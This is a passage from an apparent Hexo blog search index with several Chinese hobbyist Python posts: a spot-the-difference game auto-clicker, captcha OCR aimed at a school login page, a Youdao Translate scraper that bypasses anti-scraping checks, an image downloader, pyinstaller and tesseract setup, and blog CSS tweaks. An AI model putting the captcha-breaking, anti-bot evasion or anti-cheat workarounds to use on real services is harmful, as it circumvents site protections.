&emsp;首先就是屏幕抓取，要用PIL库里面的ImageGrab进行抓取，抓取还要对准找茬的两张图片，找这个图片位置的像素用的截图软件，截的我眼睛都快瞎了，一直对像素对了半天，图片才勉强对上。&emsp;图片对比以及处理：（之前我是准备用PIL库的image.getdata（）对比RGBA值的不同，每一行就是图片每一行像素点的RGBA值，然后判断出不同位置的坐标，利用win32api点击该坐标并进行标记，在下次点击前进行判断，如果在上一个标记的多少像素之内就不能进行点击（防止鼠标的多次点击同一块不同区内发生错误）。）后面发现有一个ImageChops.difference方法可以直接对两张图片进行对比，可以直接返回一张差异图片。这就要方便多了。在对比图片后就可以查看不同之处了。差异图片将会把差异高亮出来，其他的地方全部标黑。比如： 其实辅助做到这里就可以了哟(´・ω・`)，既然已经找到了不同之处，就可以靠鼠标点击了。但我想实现自动点击啊，不然pywin32没有用武之地啊 &emsp;找坐标值（暂未实现）：这个游戏用了反作弊，原本两个图片就有一些色差，只是肉眼不好分辨（其实仔细看也看得出来），两个图片还分别增加了噪点，虽然我们看上面对比后的图（就是几乎全黑的那个图片）没什么毛病，但其实仔细看图还是可以看到一些轮廓（不知道上传的图片压缩了没有，反正我的是看得出来的）。如果觉得不够明显，我这里有另外一个二值化的图片（不是上面对比的二值化图片）：这是另外一次测试对比图二值化后的结果，密集点的地方就是不同之处，但观察可以看到其他的地方（几乎全屏）都是点，这些就是图片的噪点对比出的结果。我是打算通过像素分析周围白点大于多少就判断为点击处（看目前这个样子是实现不了的），本人正在找去除噪点的方法。（遍历像素：判断周围多少像素内的白点大于多少，大于多少就判断为此处为应该点击的地方。有这种思路，但不知道如何实现，文档不好找鸭。） 容我想想(・ω・) （当然，方法不一定只有我这种，但我只想到这种方法。）]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单的验证码识别（PIL+pytesseract+request）。]]></title>
    <url>%2F2019%2F05%2F10%2F%E7%AE%80%E5%8D%95%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%EF%BC%88python%2Bpytesseract%2Brequest%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近打算学django框架，一些好玩的东西就放在周末玩玩。所以更这种小工具之类的好玩的东西就延后点啦(つ´ω`)つ。最近尝试做了一个超级简单的验证码识别。&emsp;&emsp;首先呢，要安装一个很重要的工具，tesseract（安装过程），然后安装pytesseract库，在cmd中输入pip install pytesseract即可，不建议安装tesserocr库，windows系统不太兼容，本人之前安装过一次tesserocr库，不仅有点小麻烦（其实也不是多麻烦，只是无法直接pip install tesserocr安装该库，要去官网下载whl文件，然后再在cmd中安装），主要是只要import后运行就报错UnicodeError(╯‵□′)╯︵┻━┻，在网上也没找到什么解决方法，这里就放弃使用tesserocr库了。 &emsp;&emsp;在安装pytesseract之后，我们就可以开始尝试啦。 &emsp;&emsp;之前登陆学校教务系统的时候就觉得学校的验证码简单，应该很容易识别。于是打算用教务系统练练手(´・ω・`) &emsp;&emsp;不多说，上代码… &emsp;&emsp;纳尼，我代码呢？(*´･д･)? &emsp;&emsp;代码，，，代码被我删了（因为是几天做的，当时没有写博客。） &emsp;&emsp;真是个坏习惯。(๑´ㅁ`)ゞ &emsp;&emsp;这里简单的说下思路吧。 &emsp;&emsp;敲重点了！ 自己找个网站，按F12查看验证码的src=”xxxx”中的内容，复制后加在网站的后面，为了便于查看每次识别的二维码图片和识别结果是否相同，下载图片。（纳尼，你不会下载图片？那我就勉为其难的告诉你下载图片吧），使用pytesseract.image_to_string(image)方法，直接将图片的下载路径传到image中。最后直接print就可以啦 这是之前做完代码后的结果： 正确率 还可以？？？？？（可以尼玛，识别都能识别歪来，不是len啊(╬ﾟ ◣ ﾟ)，本来就是一个库？哦，那没事了。） 想提高识别率嘛？(`・ω・´)最简单的方法嘛，用PIL或者opencv库对图片进行去噪，灰度和二值化处理后，会增加识别率，尤其是那种比较难的验证码，噪点比较多，颜色也多，容易对识别结果造成影响。 其他的方法就是对这个库进行训练，可以提高识别率，不过具体的训练方法本人还在摸索。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装tesseract的那些坑。]]></title>
    <url>%2F2019%2F05%2F07%2F%E5%AE%89%E8%A3%85tesseract%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近准备试一下验证码识别，学习的时候发现还是要安装一下tesseract-OCR，来进行识别。研究半天，我这里说一下我自己的安装技巧d(`･∀･)b。 （1）去官网(点击去官网)先下载任意版本，版本后面有dev或者beta的代表是测试版，不建议下载（如果没有梯子的，我这里上传到度盘了，你们可以自行下载，度盘连接，提取码：nw9s）（2）坑了我很久的地方(´ﾟдﾟ`)：在下载安装包之后在勾选的界面，后面有(download)，建议不要下载！（有梯子而且对自己的梯子速度打包票的人可以下载。）我要哭了这里，下载速度超级感人，我的梯子下东西慢的要死，要是你们没有梯子的话，我建议你们去GitHub上面下载。下载地址，在下载好压缩包后，直接将所有的文件全部解压到安装目录下的tessdata下。如图（压缩包里面会有一个文件夹和一些文件，可以直接全部放到这里面）：直接建议你们下所有的语言包，反正也不大。 （3）设置环境变量这个还是比较简单的。在 “ 此电脑 ” 下右击点击 “ 属性 ” ，点击左边的 “ 系统保护 ” 。在 “ 高级 ”一栏里面点击 “ 环境变量 ”。 双击红圈的位置，在后面输入安装的路径就可以了 在cmd里面直接输入1tesseract --version 显示版本后就代表你安装成功了！(・ω・)]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python自制翻译软件的详细过程。（requests+tkinter+pyinstaller）]]></title>
    <url>%2F2019%2F04%2F25%2Fpython%E8%87%AA%E5%88%B6%E7%BF%BB%E8%AF%91%E8%BD%AF%E4%BB%B6%E7%9A%84%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E3%80%82%EF%BC%88requests%2Btkinter%2Bpyinstaller%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这里直接爬取的是有道翻译。 第一步：利用requests库爬取有道翻译&emsp;&emsp;有两种解决网站反爬的措施：&emsp;&emsp;1、直接暴力破解有道翻译的salt，sign，ts，bv值。&emsp;&emsp;2、修改url绕过反爬。 &emsp;&emsp;在有道页面按下F12并刷新，随便输入一句话进行翻译，可以在network项里面发现一个名为translate….什么的，打开其response项，可以发现我输入的话和翻译。 看headers里面的data： 可以看到 i 后面的就是你输入的东西，至于红圈里面的东西，就是网站反爬所用的。我这里只讲绕过反爬的url，如果想暴力破解的，可以参考这篇博客 然后就可以利用headers=header来模拟浏览器了。将这里面的request headers里面的内容全部复制一遍，并加上引号。 坑了我好久的一个坑(☍﹏⁰。) ：将request headers里面的Content-Type属性也复制进去，导致只能输入英文，输入其他语言文字结果返回的是’???’。 我也不知道为什么这里返回会有问题。当时我也是想了很久，试了下日文也是’???’，搞不懂为什么返回的是问号，我拿别人的代码可以用，但我的就不行，我对比了一下，代码没有什么错误，大致是一样的。但我发现他的headers以及data里面和我不一样，于是我就试试把headers里面的代码一行行删掉进行尝试，最终发现是Content-Type属性搞的鬼(╯‵□′)╯︵┴─┴，去掉这行后结果就正常了。（我猜应该是这个属性限制了输入的文本，也就是只能识别英文，输入其他语言的文字不识别乱码则输入进去的时候就输入的是’???’，所以返回的就是’???’）。 爬取什么的还是和一般爬虫的思路一样，不过这里要注意了，url不能简单的使用有道翻译的原网站：http://fanyi.youdao.com/ 。原网站使用了反爬，我这里找到了两个可以绕过爬虫的url：1、http://fanyi.youdao.com/translate 。这个网站点进去还是会跳到有道翻译的网站去，但按F12发现该网站是一个301重定向的状态，也就是进入该网站还是会自动跳到有道翻译的网站，但这样却能直接跳过网站的反爬，真神奇。（我也不知道怎么解释（¯﹃¯），不过得出一个结论，（大概吧）如果网站反爬的话，可以通过能定向到该网站的url进行爬虫可以绕过反爬措施。）2、也是在该translate……下可以找到翻译的url，直接复制后，去掉translate后面的’_o’字符也可以绕过反爬。 这里的部分代码如下，返回的是翻译的结果：1234567891011121314trans = input()data=&#123; &apos;i&apos;:trans, ......&#125;header=&#123; &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;, ......&#125;url = &apos;http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&apos;response = requests.post(url,headers=header,data=data)a = response.json()translation = a[&apos;translateResult&apos;][0][0][&apos;tgt&apos;]print(translation) 第二步：利用tkinter做界面。这里都是些基本操作，tkinter的基础就能做出来。不过要知道以下知识：①text文本框有一个state，有disabled（只读）和normal（可读可写）两种属性，要翻译的文本框可以不用设置state，翻译的结果就设置disabled。顺便还可以给它加一个背景颜色。’#ccc’更加生动（吃了文化的亏，不知道怎么形容了）。②在定义完后要把东西放进去，有3种方法：pack（），grid（），place（）。推荐使用grid（）方法，关于区别，可以看这篇博客 第三步：利用pyinstaller打包成exe文件。这里安装坑也多。详见这篇我之前写的博客。安装完成后。在cmd中输入cd 你的.py文件所在的目录。然后输入pyinstaller -F -w xxx.py（-w是为了不显示dos窗口）等待一段时间，就打包完成啦。exe就在目标目录下的dist文件夹下。也许你会觉得图标有点丑，我这里有一个教程，详见这篇博客对了，如果你应用图标后发现图标并没有变，你就可以把他移动一下（比如把它复制到桌面或者其他路径都可以），图标就变了。 这里贴上我的源代码吧(:3 」∠ )(……里面就是data和header里面的参数，这里略过了)12345678910111213141516171819202122232425262728293031323334353637import requestsimport tkinterdef en2zh(): trans = textbef.get(&apos;0.0&apos;,&apos;end&apos;) data = &#123; &apos;i&apos;:trans, &apos;...... &#125; header = &#123; &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;, ...... &#125; url = &apos;http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&apos; response = requests.post(url,headers=header,data=data) a = response.json() translation = a[&apos;translateResult&apos;][0][0][&apos;tgt&apos;] textaft[&apos;state&apos;]=&apos;normal&apos; textaft.delete(1.0,&apos;end&apos;) textaft.insert(&apos;end&apos;,translation) textaft[&apos;state&apos;] = &apos;disabled&apos;windows = tkinter.Tk()windows.title(&quot;jizhihaoSAMA&apos;s Translation？not really!&quot;)windows.geometry(&apos;710x300&apos;)welc = tkinter.Label(windows,text=&quot;Let&apos;s start!&quot;,font=(&apos;Georgia&apos;,28))welc.grid(row=0,columnspan=3)textbef = tkinter.Text(width=40,height=10)textbef.grid(row=2,column=0)en2zhbutton = tkinter.Button(activebackground=&apos;#ccc&apos;,text=&apos;Auto translate&apos;,command=en2zh,font=(&apos;Georgia&apos;,12))en2zhbutton.grid(row=2,column=1,padx=15)textaft = tkinter.Text(bg=&apos;#ccc&apos;,width=40,height=10,state=&apos;disabled&apos;)textaft.grid(row=2,column=2)bef = tkinter.Label(windows,fg=&apos;brown&apos;,text=&quot;input the text you want to translate:&quot;,font=(&apos;Georgia&apos;,12))bef.grid(row=1,column=0,sticky=&apos;W&apos;)aft = tkinter.Label(windows,fg=&apos;brown&apos;,text=&quot;translation:&quot;,font=(&apos;Georgia&apos;,12))aft.grid(row=1,column=2,sticky=&apos;W&apos;)windows.mainloop() 界面如下：（看看这个翻译软件说的都是大实话~◝(^▿\^)◜） 大功告成！（๑ • ‿ • ๑ ）]]></content>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装pyinstaller的方法，及本人安装pyinstaller踩过的坑。]]></title>
    <url>%2F2019%2F04%2F24%2Fpyinstaller%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[安装pyinstaller首先要安装pywin32，在cmd中1pip install pywin32 安装完成后，继续输入1pip install pyinstaller 最后一行出现了1AttributeError: module &apos;setuptools.build_meta&apos; has no attribute &apos;__legacy__&apos; 奇怪的是，百度居然连这个代码一点都搜不到辣鸡百度，谷歌流弊，不过也就在github上面找到了一条记录，它安装的不是pyinstaller，是另外一个包。 出现的原因：1.包的版本pip&gt;=19.0.22.使用的是virtualenv与--system-site-packages（虽然我不知道这是什么意思）3.包的版本setuptools &lt; 40.8.0。4.您正在安装的软件包未build-backend=&quot;setuptools.build_meta&quot;在其中指定pyproject.toml。（我还是不知道这啥意思）本人的解决方法：更新setuptools包至最新版。当解决这个问题之后，继续输入1pip install pyinstaller又出现了问题，最后一行的代码是：1error: invalid command &apos;bdist_wheel&apos;本人的解决方法： 直接在cmd中输入pip install wheel即可 最后就是下载环节了。还没下载完成出现一大堆红字，然后很长一堆代码，结尾是Read timed out. 额，这个会点英语都知道吧？就是网络问题了，翻墙下载吧。就没问题了。 大功告成，安装成功~ \(・ω・)/]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义博客--看板娘透明度以及鼠标移动在头像上的变化]]></title>
    <url>%2F2019%2F04%2F15%2F%E7%9C%8B%E6%9D%BF%E5%A8%98%E9%80%8F%E6%98%8E%E5%BA%A6%E4%BB%A5%E5%8F%8A%E5%A4%B4%E5%83%8F%E5%8F%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这篇博客所完成的事情花了我很久的时间。 看板娘的透明度&emsp;&emsp;之前看板娘的透明度我在网上找了很久都没找到相关教程，之前也看到有一些人的博客的看板娘是透明的，按照一些人的代码来看，应该在站点配置文件里面加入123react: defaultOpacity: 0.8 hoverOpacity: 1 但代码加入后并没有什么用，于是我便考虑在…/themes/next/source/css/custom/custom.styl中直接通过css代码来修改看板娘的透明度。那么问题就来了，当初我找不到看板娘的id或者class，我通过chrome的F12下通过鼠标移动来查看class和id的方法根本就移动不到看板娘上面，如图： 即使我把鼠标移动在血小板上面仍然显示的是其他的标签，后来我硬是会觉得不透明有时候缩放什么的会挡住字，不太好，于是还是不打算放弃(๑•̀ㅂ•́)و✧，在F12里面直接看文件的html代码，当我把所有的标签全部最简化的时候，我终于发现了看板娘的标签。 当时内心十分高兴的(:3 」∠ )，于是边马上在custom里面加上了如下代码：123.live-2d-widget &#123; opacity: 0.9;&#125; 保存后发现并没有透明，我才发现原来它这个style是内联的，哇，很难受，我只知道内联的优先级比外面的css代码的优先级高，所以当时又无可奈何了，于是开始了我的面向百度的编程，后面搜到优先级最高的是!important，于是在css里面加上了如下代码123.live-2d-widget &#123; opacity: 0.9 !important&#125; 于是便大功告成了。(๑•́ ₃ •̀๑) 移动到头像上面显示另外一个照片&emsp;&emsp;本人做这个的目的纯属只是为博客增加一点新意，我是打算将鼠标移动在我头像上面就可以笑起来的那种，上图： 这个就花了我很长的时间，首先我得要P图，这个还好，把眼睛抠出来之后直接填充掉然后再把眉毛抠出来填充掉再移动就可以了。比较烦的就是我P完之后当时硬是不知道怎么做。我试过如下方法： 失败的方法1：直接利用hover进行background-image修改&emsp;&emsp;这是我最先用的方法，但我查看源码：之后发现，它已经是直接插入了，不能修改成background插入。所以最终这个方法失败了。 失败的方法2：尝试通过jQuery的mouseenter事件和mouseleave事件进行图片变换&emsp;&emsp;这是我第二个想到的方法，我打开…/themes/next/source/js/post-details文件，我一看到这一串代码，我就想，噫，这很像jQuery的代码哟？太爽了把(๑•̀ω•́๑)，于是我便在这后面利用jQuery事件进行修改，保存之后发现原网页并没有变化，我当时就有点懵了，于是上网查查scrollspy方法，发现jQuery并没有这种方法，也就是说，原网页用的并不是jQuery的代码，也没有引入jQuery库，所以根本无法使用jQuery里面的方法。然后又发现这居然是bootstrap里面的滚动监听事件，额，由于bootstrap没学，我也就短短的看了几下有哪些事件，发现好像还是不能完成我的那种要求（我并没有仔细学），于是这个方法也失败了(´;ω;`)。 失败的方法3：利用js dom的onmouseover和onmouseout事件。&emsp;&emsp;我想着这里面有var，有function，有if语句什么的，我想这里面也有js语句把，我大概看了一下用法，发现要在原html的标签里面加入代码，但不能修改，所以这方法也失败了 : c。 失败的方法4：百度的答案在css后面加入expression表达式加入event事件。&emsp;&emsp;不多说了，上图： 我尝试着改了他的格式进行代码增加，但保存后还是没用（或许是我用的方式不对吧），后面我也查了css的expression的有关知识，据说曾经的浏览器支持expression表达式，但由于过于占资源等问题在IE8被微软弃用了，后来我在百度知道上问了关于expression的知识，也没有什么结果。 最后，终于成功了5555ε(*´･∀･｀)зﾞ&emsp;&emsp;万能的百度，我最终在百度大神的指导下了解了一种思路：由于情况的特殊，可以利用hover当鼠标移动在头像上的时候直接将透明度设置为0。然后设置其父系的background的大小和位置以及不能重复的属性（这个要调一会儿，因为要对比，使background图片完全在头像下面，大小要合适）。最终终于大功告成了！！！哈哈啊哈哈哈哈啊哈哈哈哈哈哈哈哈哈哈哈(๑´·ㅂ·｀๑)，前端真的很强大鸭~]]></content>
      <tags>
        <tag>博客</tag>
        <tag>美化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python简单的图片爬去以及批量下载]]></title>
    <url>%2F2019%2F04%2F14%2Fpython%E5%9B%BE%E7%89%87%E7%88%AC%E5%8F%96%E5%92%8C%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;好久没学习爬虫了，于是天天浮躁搭博客，现在学习下载文件试试，今天就试了试下载图片，SADE，开始吧。d(`･∀･)b。 &emsp;&emsp;我是以谭文弟弟的博客为例子，这个B标签太多了内容太难提取了，我于是打算下载他博客中所有图片，我们先进入这个B的博客页面，按下F12查看源，可以得到页面的html代码，额，这里只爬取图片所以很简单图片嘛，我们只需要在标签的&lt;img src=&quot;x&quot;&gt;可以知道图片的url，那么我们先用表达式匹配所有x中的内容。 （一）利用正则表达式（还能用xpath，css选择器等方法）筛选出图片的url&emsp;&emsp;重要的地方来了，仅从字符串来看，我们只需要匹配src=”（第一个引号） 到 “&gt;（第二个引号）前，我们只需获取x的字符串，于是我们可以使用正则表达式的零宽断言，正则表达式应为：(?&lt;=src=&quot;).*(?=&quot;&gt;)。 （二）在筛选出url之后下载图片文件&emsp;&emsp;这里要用到文件编程IO的知识，图片应该以二进制方式打开，打开下载的路径并以打开方式为wb+。1with open(path,&apos;wb+&apos;) as f: 这里处理之后f就是一个文件变量（本人自己定义的），该变量有write函数，就是字面意思，写。当我们筛选出图片的url后，又要再次利用request.get(url)进行下载，然后再通过该response对象的.content对象（.content是二进制数据，.text是文本格式，由于图片是二进制，所以这里要用content）。 （三）关于下载文件的命名问题&emsp;&emsp;这里直接按照爬取后的顺序下载进行编号，对下载文件进行下载名字应该不能重复，不然最后应该只会保存最后一张图片（理论上来说）,所以在打开文件的时候，此时的路径就是存储的路径，打开的某.jpg（.png等图片格式都行，下载之后都会按照这种格式保存，由此都可以），比如这里可以在外面设置一个变量，然后每执行一次for循环就+1，之前我有这种思路但代码不知道怎么写，百度了一下，可以用引号与加法的结合，于是，成功啦(,,・ω・,,)。 这里是本人的代码哟，可以参考一下~123456789101112import requestsimport relan = requests.get(&quot;https://firstkaixin.github.io/2019/03/18/%E4%B8%80%E5%88%B0%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%9A%84%E9%A2%98%E7%9B%AE/#more&quot;)html = lan.textimghtml = re.compile(r&apos;(?&lt;=content=&quot;).+png(?=&quot;)&apos;)c = imghtml.findall(html) #返回一个匹配正则表达式字符串的所有的列表count = 0for i in c: imgdl = requests.get(i) #可以理解为获取下载链接 with open(&apos;F:\img&apos;+str(count)+&apos;.png&apos;,&apos;wb+&apos;) as f: #存储图片的路径和名字 f.write(imgdl.content) #以二进制写入文件 count+=1;]]></content>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[美化博客]]></title>
    <url>%2F2019%2F04%2F10%2F%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;我终于把博客美化完了，真好，花了我两天时间&emsp;&emsp;我发现这个next主题还挺好用的，还好自己学了一点做web的语言，这个主题的能够通过主题文件夹里面的source/css/_custom文件进行某些地方的自定义，虽然不能全部自定义（本来我是准备利用hover对我的头像进行一点小改动的，但改不了，很难过。我p图p了很久（TヘT）。 &emsp;&emsp;那么我简单说一下我自己美化用的东西吧： &emsp;&emsp;1、拿血小板做看板娘（用了live2d），点我去教程呀(&gt;▽&lt;) ，我想改一改血小板的透明度呀，但不知道怎么改。 &emsp;&emsp;2、背景美化（当然我的不是完全按照他的来的，我自己还改了一些地方(｡･∀･)ﾉ），点我去教程呀(&gt;▽&lt;) &emsp;&emsp;3、阅读时长，总字数（这个由于更新后，网上的很多旧的方法都不可行，这个教程我找了很久。(*ﾟｰﾟ)）点我去教程啊(&gt;▽&lt;) &emsp;&emsp;4、浏览人数：这个自己百度不蒜子统计，就可以了，也可以去官网看文档。 &emsp;&emsp;5、这里还有一个更全的教程，可以看看：点我去看更详细的教程呀。(&gt;▽&lt;) &emsp;&emsp;自己打算再继续为看板娘设置更多功能~嘻嘻(๑•̀ㅂ•́)و✧]]></content>
      <tags>
        <tag>闲谈</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一个博客（搬家啦~）]]></title>
    <url>%2F2019%2F04%2F09%2F%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%EF%BC%88%E6%90%AC%E5%AE%B6%E5%95%A6-%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;&nbsp;我之前是用的CSDN的博客嘛，觉得CSDN的样式有点丑，广告也挺多的，想自己也搭个播客，这里是我的原博客~&emsp;&emsp;&nbsp;搭个人博客的方法我感觉有点小复杂，不过庆幸的是，有个人给了我办法。这里是方法哟，不用花多少时间。 &emsp;&emsp;&nbsp;博客的话我还是以这个更新为主把，另外一个博客的话看情况吧，要是我勤快的话就2个都更，懒得话就更新这个咯，hh]]></content>
      <tags>
        <tag>闲谈</tag>
      </tags>
  </entry>
</search>
